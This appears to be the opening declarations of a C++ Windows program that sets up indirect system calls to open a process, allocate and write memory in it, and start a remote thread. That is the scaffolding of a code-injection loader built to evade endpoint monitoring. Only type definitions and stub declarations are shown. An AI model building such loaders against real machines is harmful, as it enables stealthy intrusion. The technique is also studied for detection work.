#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <string>
#include <cwchar>
#include <stdio.h>
#include <stdint.h>
#include <time.h>
#include <ntstatus.h>

typedef NTSTATUS(NTAPI* PUSER_THREAD_START_ROUTINE)(_In_ PVOID ThreadParameter);

typedef const OBJECT_ATTRIBUTES* PCOBJECT_ATTRIBUTES;
typedef const CLIENT_ID* PCLIENT_ID;


typedef struct _INITIAL_TEB {
    struct {
        PVOID OldStackBase;
        PVOID OldStackLimit;
    } OldInitialTeb;

    PVOID StackBase;
    PVOID StackLimit;
    PVOID StackAllocationBase;

} INITIAL_TEB, * PINITIAL_TEB;

//typedef NTSTATUS(NTAPI* my_NtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, CLIENT_ID* ClientId);
//
//typedef NTSTATUS(NTAPI* my_NtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG BufferSize, PULONG NumberOfBytesWritten);
//
//typedef NTSTATUS(WINAPIV* my_NtAllocateVirtualMemory)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG);

//typedef NTSTATUS(WINAPIV* my_NTCreateThreadex)(PHANDLE, ACCESS_MASK, PCOBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, LPVOID);

//typedef NTSTATUS(WINAPIV* my_NtWaitForSingleObject)(HANDLE, BOOLEAN, PLARGE_INTEGER);

extern "C" {
    extern int my_asm_NtOpenProcess(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
    extern int my_asm_NtAllocateVirtualMemory(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    extern int my_asm_NtWriteVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    extern int my_asm_NTCreateThreadex(PHANDLE, ACCESS_MASK, PCOBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, LPVOID);
    extern int my_asm_NtWaitForSingleObject(HANDLE, DWORD);

    DWORD64 syscallAddress_NtOpenProcess = 0;
    DWORD64 syscallAddress_AllocateVirtualMemory = 0;
    DWORD64 syscallAddress_NtWriteVirtualMemory = 0;
    DWORD64 syscallAddress_CreateThreadEx = 0;
    DWORD64 syscallAddress_NtWaitForSingleObject = 0;
}